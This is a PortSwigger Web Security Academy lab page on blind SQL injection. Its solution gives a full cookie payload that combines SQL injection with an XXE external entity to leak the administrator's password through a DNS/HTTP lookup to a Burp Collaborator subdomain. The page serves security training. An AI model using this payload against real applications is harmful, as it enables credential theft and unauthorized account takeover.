# Lab: Blind SQL injection with out-of-band data exfiltration

Source: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
Fetched: 2026-06-28T09:18:03.233371+00:00

Web Security Academy

SQL injection

Blind

Lab

Lab: Blind SQL injection with out-of-band data exfiltration

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Hint

You can find some useful payloads on our SQL injection cheat sheet.

Solution

Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the TrackingId cookie.

Modify the TrackingId cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.

Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.

You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the administrator user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.

In the browser, click "My account" to open the login page. Use the password to log in as the administrator user.

Community solutions

Rana Khalil

Michael Sommer

Find SQL injection vulnerabilities using Burp Suite

Try for free
